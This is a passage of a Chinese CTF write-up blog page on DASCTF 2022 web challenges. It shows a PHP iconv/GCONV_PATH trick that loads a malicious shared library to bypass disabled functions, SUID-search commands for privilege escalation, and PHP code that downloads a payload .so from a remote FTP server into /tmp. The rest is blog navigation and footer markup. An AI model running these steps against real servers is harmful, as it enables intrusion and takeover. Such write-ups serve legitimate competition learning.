SplFileObject(&#x27;/tmp/gconv-modules&#x27;,&#x27;w&#x27;);</span></span><br><span class="line"><span class="variable">$file2</span>-&gt;fwrite(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/22058e6981e0663be190b1fe79986b9b.png" alt="image-20220330111625947"></p>
+<p>触发</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);show_source(&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.payload.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;payload.so&quot;); </span><br></pre></td></tr></table></figure>
+
+<p>没有权限读取flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e4dc7b9344ef991fcf08868fa721e219.png" alt="image-20220330113009866"></p>
+<p>尝试suid提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/be1b18b42d06e8ba5162f8a5531e6979.png"></p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>还有利用 <strong>ftp</strong> 进行写操作</p>
+<p>python开启ftp服务</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">authorizer = DummyAuthorizer()</span><br><span class="line"></span><br><span class="line">authorizer.add_anonymous(<span class="string">&quot;./&quot;</span>)</span><br><span class="line"></span><br><span class="line">handler = FTPHandler</span><br><span class="line">handler.authorizer = authorizer</span><br><span class="line"></span><br><span class="line">handler.masquerade_address = <span class="string">&quot;ip&quot;</span></span><br><span class="line"><span class="comment"># 注意要用被动模式</span></span><br><span class="line">handler.passive_ports = <span class="built_in">range</span>(<span class="number">9998</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">server = FTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">23</span>), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>php下载</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$local_file</span> = <span class="string">&#x27;/tmp/hack1.so&#x27;</span>;</span><br><span class="line"><span class="variable">$server_file</span> = <span class="string">&#x27;hack.so&#x27;</span>;</span><br><span class="line"><span class="variable">$ftp_server</span> = <span class="string">&#x27;xxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$ftp_port</span>=<span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ftp</span> = ftp_connect(<span class="variable">$ftp_server</span>,<span class="variable">$ftp_port</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login_result</span> = ftp_login(<span class="variable">$ftp</span>, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// 注意要开启被动模式</span></span><br><span class="line">ftp_pasv(<span class="variable">$ftp</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ftp_get(<span class="variable">$ftp</span>, <span class="variable">$local_file</span>, <span class="variable">$server_file</span>, FTP_BINARY)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Successfully written to <span class="subst">$local_file</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;There was a problem\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_close(<span class="variable">$ftp</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="http://rayi.vip/2022/03/26/2022DAS%E4%B8%89%E6%9C%88/">2022DASCTF三月月赛-WriteUp | Site-01 (rayi.vip)</a></p>
+<p><a target="_blank" rel="noopener" href="https://erroratao.github.io/writeup/DASCTF2022xSU/">（●´3｀●）やれやれだぜ (erroratao.github.io)</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/29/FastJson(%E4%B8%80)/" rel="prev" title="Fastjson(一)">
+      <i class="fa fa-chevron-left"></i> Fastjson(一)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezpop"><span class="nav-number">2.</span> <span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#calc"><span class="nav-number">3.</span> <span class="nav-text">calc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#upgdstore"><span class="nav-number">4.</span> <span class="nav-text">upgdstore</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-number">5.</span> <span class="nav-text">补充</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
